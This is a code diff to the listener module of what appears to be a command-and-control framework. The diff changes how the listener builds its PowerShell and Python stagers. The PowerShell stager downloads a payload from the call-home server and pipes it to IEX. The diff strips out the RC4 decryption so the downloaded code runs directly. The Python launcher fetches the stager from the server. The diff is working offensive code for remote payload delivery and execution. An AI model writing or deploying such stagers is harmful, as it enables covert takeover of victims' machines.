@@ -244,23 +244,19 @@ class Listener:
             # code to turn the key string into a byte array
             stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
 
-            # this is the minimized RC4 stager code from rc4.ps1
-            stager += listener_util.powershell_rc4()
-
             # Use routingpacket from foreign listener
             b64RoutingPacket = listenerOptions["RoutingPacket"]["Value"]
 
-            # add the RC4 packet to a cookie
+            # add the routing packet to a cookie
             stager += f'$wc.Headers.Add("Cookie","session={b64RoutingPacket}");'
 
             stager += (
                 f"$ser= {helpers.obfuscate_call_home_address(host)};$t='{stage0}';"
             )
             stager += "$data=$wc.DownloadData($ser+$t);"
-            stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
 
             # decode everything and kick it over to IEX to kick off execution
-            stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+            stager += "IEX ([Text.Encoding]::UTF8.GetString($data))"
 
             # Remove comments and make one line
             stager = helpers.strip_powershell_comments(stager)
@@ -307,7 +303,7 @@ class Listener:
 
             b64RoutingPacket = listenerOptions["RoutingPacket"]["Value"]
 
-            # add the RC4 packet to a cookie
+            # add the routing packet to a cookie
             launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={b64RoutingPacket}")];\n'
             launcherBase += "import urllib.request;\n"
 
@@ -348,7 +344,7 @@ class Listener:
 
             # install proxy and creds globally, so they can be used with urlopen.
             launcherBase += "urllib.request.install_opener(o);\n"
-            launcherBase += "a=o.open(server+t).read();\n"
+            launcherBase += "data=o.open(server+t).read();\n"
 
             # download the stager and extract the IV
             launcherBase += listener_util.python_extract_stager(stagingKey)
